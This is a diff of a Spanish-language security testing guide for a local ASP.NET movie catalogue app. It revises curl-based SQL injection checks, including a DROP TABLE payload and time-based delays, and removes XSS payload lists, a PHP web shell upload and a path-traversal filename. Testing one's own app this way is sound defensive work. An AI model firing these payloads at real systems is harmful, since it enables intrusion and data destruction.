@@ -11,7 +11,7 @@ Verificar si la app valida correctamente las entradas del usuario y previene iny
 ### 📡 Request básico de búsqueda
 
 ```bash
-curl -i "http://localhost:5247/Peliculas?searchString=matrix"
+curl -i "http://localhost:5247/Peliculas?searchString=Peli1"
 ```
 
 **¿Qué devuelve?**
@@ -64,31 +64,62 @@ Unclosed quotation mark after the character string ''.
 
 ### 📡 Payloads clásicos de SQL Injection
 
+Para verificar sin revisar todo el HTML, vamos a usar comandos más directos que nos muestren solo lo relevante.
+
+**1. Comparar búsqueda normal vs SQL injection (contar resultados):**
+
 ```bash
-# 1. Bypass de autenticación (no aplica aquí, pero es un clásico)
-curl -i "http://localhost:5247/Peliculas?searchString=' OR '1'='1"
+# Búsqueda normal (debería dar 0 si no existe)
+curl -s -G --data-urlencode "searchString=ZZZZZZZ" "http://localhost:5247/Peliculas" | grep -c "card-title"
 
-# 2. Comentar el resto de la query
-curl -i "http://localhost:5247/Peliculas?searchString=' OR 1=1--"
-curl -i "http://localhost:5247/Peliculas?searchString=' OR 1=1#"
-curl -i "http://localhost:5247/Peliculas?searchString=' OR 1=1/*"
-
-# 3. UNION para extraer datos de otras tablas
-curl -i "http://localhost:5247/Peliculas?searchString=' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
-
-# 4. Stacked queries (ejecutar múltiples comandos)
-curl -i "http://localhost:5247/Peliculas?searchString='; DROP TABLE Peliculas--"
-
-# 5. Time-based blind SQLi
-curl -i "http://localhost:5247/Peliculas?searchString=' AND WAITFOR DELAY '00:00:05'--"
+# Con SQL injection (si es vulnerable, devolverá TODAS las películas)
+curl -s -G --data-urlencode "searchString=' OR '1'='1" "http://localhost:5247/Peliculas" | grep -c "card-title"
 ```
 
-**¿Qué buscar en las respuestas?**
+Si ambos dan 0 → **PROTEGIDO** (Entity Framework parametriza correctamente)  
+Si el segundo da más resultados → **VULNERABLE**
 
-- ❌ Error de SQL expuesto → **VULNERABLE**
-- ❌ Demora de 5 segundos en responder (time-based) → **VULNERABLE**
-- ❌ Devuelve datos de otras tablas → **VULNERABLE**
-- ✅ Respuesta normal 200 (trata el payload como texto) → **PROTEGIDO**
+**2. Buscar errores SQL en la respuesta:**
+
+```bash
+# Probar con comilla simple y buscar mensajes de error
+curl -s -G --data-urlencode "searchString='" "http://localhost:5247/Peliculas" | grep -iE "sql|error|exception|database"
+```
+
+Si no devuelve nada → **PROTEGIDO**  
+Si muestra errores SQL → **VULNERABLE**
+
+**3. Time-based SQLi (verificar tiempo de respuesta):**
+
+```bash
+# Ver tiempo de respuesta normal
+curl -s -o /dev/null -w "HTTP: %{http_code} | Tiempo: %{time_total}s\n" -G --data-urlencode "searchString=Matrix" "http://localhost:5247/Peliculas"
+
+# Con payload de delay
+curl -s -o /dev/null -w "HTTP: %{http_code} | Tiempo: %{time_total}s\n" -G --data-urlencode "searchString=' AND WAITFOR DELAY '00:00:05'--" "http://localhost:5247/Peliculas"
+```
+
+Si el segundo tarda 5+ segundos más → **VULNERABLE**  
+Si tarda lo mismo → **PROTEGIDO**
+
+**4. Otros payloads clásicos:**
+
+```bash
+# UNION SELECT
+curl -s -G --data-urlencode "searchString=' UNION SELECT NULL,NULL,NULL--" "http://localhost:5247/Peliculas" | grep -c "card-title"
+
+# Comentar query
+curl -s -G --data-urlencode "searchString=' OR 1=1--" "http://localhost:5247/Peliculas" | grep -c "card-title"
+
+# Stacked queries
+curl -s -G --data-urlencode "searchString='; DROP TABLE Peliculas--" "http://localhost:5247/Peliculas" | grep -iE "sql|error"
+```
+
+**Análisis:**
+
+- ✅ **En esta app**: Entity Framework usa consultas parametrizadas por defecto
+- ✅ El código del controlador: `p.Titulo.Contains(searchString)` se traduce a parámetros seguros
+- 🟢 **Resultado esperado**: NO vulnerable a SQLi en búsqueda
 
 ---
 
@@ -163,30 +194,6 @@ Abre `xss_test.html` y busca:
 - ❌ Si el script aparece sin escapar → **VULNERABLE A XSS**
 - ✅ Si aparece como `&lt;script&gt;` → **PROTEGIDO** (HTML encoding)
 
----
-
-### 📡 XSS con diferentes payloads
-
-```bash
-# 1. Script básico
-curl -s "http://localhost:5247/Peliculas?searchString=<script>alert(1)</script>" -o test1.html
-
-# 2. Event handler (onerror)
-curl -s "http://localhost:5247/Peliculas?searchString=<img src=x onerror=alert(1)>" -o test2.html
-
-# 3. SVG con onload
-curl -s "http://localhost:5247/Peliculas?searchString=<svg onload=alert(1)>" -o test3.html
-
-# 4. Iframe con javascript:
-curl -s "http://localhost:5247/Peliculas?searchString=<iframe src=javascript:alert(1)>" -o test4.html
-
-# 5. Body con onload
-curl -s "http://localhost:5247/Peliculas?searchString=<body onload=alert(1)>" -o test5.html
-
-# 6. Input con autofocus y onfocus
-curl -s "http://localhost:5247/Peliculas?searchString=<input autofocus onfocus=alert(1)>" -o test6.html
-```
-
 **Verificar manualmente:**
 Abre cada archivo HTML en el navegador:
 
@@ -234,71 +241,96 @@ Abre `peliculas_list.html` en el navegador:
 grep "<script>alert" peliculas_list.html
 ```
 
----
+## ✅ Prueba 3: Seguridad en upload de archivos
 
-### 📡 XSS en otros campos (Descripción, etc.)
-
-```bash
-# XSS en la descripción
-TOKEN=$(curl -s -c xss2_cookies.txt http://localhost:5247/Peliculas/Create | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')
-
-curl -X POST http://localhost:5247/Peliculas/Create \
-  -b xss2_cookies.txt \
-  -d "__RequestVerificationToken=$TOKEN" \
-  -d "Titulo=Pelicula Normal" \
-  -d "Descripcion=<img src=x onerror=alert('XSS en descripcion')>" \
-  -d "FechaLanzamiento=2025-11-26" \
-  -d "Duracion=90" \
-  -d "GeneroId=1" \
-  -d "DirectorId=1" \
-  -L -s -o xss_desc.html
-```
-
-**Verificar en la vista de detalles:**
+### 📡 Crear un archivo de imagen de prueba
 
 ```bash
-# Asume que se creó con ID 10
-curl -s http://localhost:5247/Peliculas/Details/10 > details_xss.html
+# Crear una imagen PNG válida (1x1 pixel)
+printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82' > test.png
 ```
-
-Abre `details_xss.html` en el navegador y verifica si se ejecuta el payload.
 
 ---
 
-## ✅ Prueba 3: Inyección de comandos (si hay upload de archivos)
-
-### 📡 Verificar si existe funcionalidad de upload
+### 📡 Subir el archivo de imagen
 
 ```bash
-curl -s http://localhost:5247/Peliculas/Create | grep -i "input.*type=\"file\"\|upload"
+# Subir archivo con todos los campos necesarios
+curl -X POST http://localhost:5247/Peliculas/Create -b upload_cookies.txt -F "__RequestVerificationToken=$TOKEN" -F "Titulo=Test Image" -F "Sinopsis=Test" -F "FechaEstreno=2025-01-01" -F "Duracion=120" -F "GeneroId=1" -F "DirectorId=1" -F "ImagenArchivo=@test.png" -L -o response.html
 ```
 
-**Si encuentra `<input type="file">`:**
+**Qué observar:**
+
+- El progreso del upload (% Total, % Received)
+- Si completa exitosamente (100% en ambos)
+
+---
+
+### 📡 Verificar que la película se creó con la imagen
 
 ```bash
-# Crear archivo malicioso
-echo "<?php system(\$_GET['cmd']); ?>" > shell.php.jpg
-
-# Intentar subirlo
-curl -X POST http://localhost:5247/Peliculas/Create \
-  -F "Imagen=@shell.php.jpg" \
-  -F "Titulo=Test Upload" \
-  -F "..." \
-  ...
+# Buscar la película y la ruta de la imagen
+grep -i "test image\|error\|invalid" response.html
 ```
 
-**Buscar path traversal:**
+**Resultado esperado:**
 
-```bash
-# Nombre de archivo con path traversal
-curl ... -F "Imagen=@test.jpg;filename=../../../evil.jpg"
+```html
+<img src="/imagenes/peliculas/13fc67dd-ef8e-4df7-bf36-a84cf2c09eda.png" class="card-img-top" alt="Imagen de Test Image"
+<h5 class="card-title">Test Image</h5>
 ```
 
 **Análisis:**
 
-- ❌ Si permite subir `.php`, `.aspx`, `.exe` → **VULNERABLE**
-- ❌ Si no valida el nombre y permite `../` → **PATH TRAVERSAL**
-- ✅ Si solo acepta imágenes y sanitiza nombres → **PROTEGIDO**
+- ✅ La imagen se subió exitosamente
+- ✅ Se generó un GUID único para el nombre del archivo (previene path traversal)
+- ✅ Se guardó en la subcarpeta `/imagenes/peliculas/`
+
+---
+
+### 📡 Ver la estructura de carpetas donde se guardó
+
+```bash
+ls -la peliculasweb/wwwroot/imagenes/
+```
+
+**Resultado esperado:**
+
+```
+drwxr-xr-x 1 ASUS 197121 0 Nov 26 19:44 actores/
+drwxr-xr-x 1 ASUS 197121 0 Nov  3 18:16 cines/
+drwxr-xr-x 1 ASUS 197121 0 Nov 27 00:52 peliculas/
+drwxr-xr-x 1 ASUS 197121 0 Nov  3 18:16 trabajadores/
+```
+
+**Análisis:**
+
+- ✅ Carpetas organizadas por tipo de entidad
+- ✅ Las imágenes no se guardan en la raíz de `/imagenes/`
+
+---
+
+### 📡 Intentar acceder directamente con el nombre original
+
+```bash
+curl -i http://localhost:5247/imagenes/test.png
+```
+
+**Resultado esperado:**
+
+```
+HTTP/1.1 404 Not Found
+```
+
+**Análisis:**
+
+- ✅ **PROTEGIDO**: No se puede acceder usando el nombre original del archivo
+- ✅ El servidor renombra los archivos con GUID, lo que previene:
+  - Path traversal (`../../../etc/passwd`)
+  - Sobrescritura de archivos existentes
+  - Nombres maliciosos con caracteres especiales
+
+**Conclusión:** El sistema de upload está bien protegido, usa nombres únicos (GUID) y organiza los archivos en subcarpetas específicas.
 
 ---
 
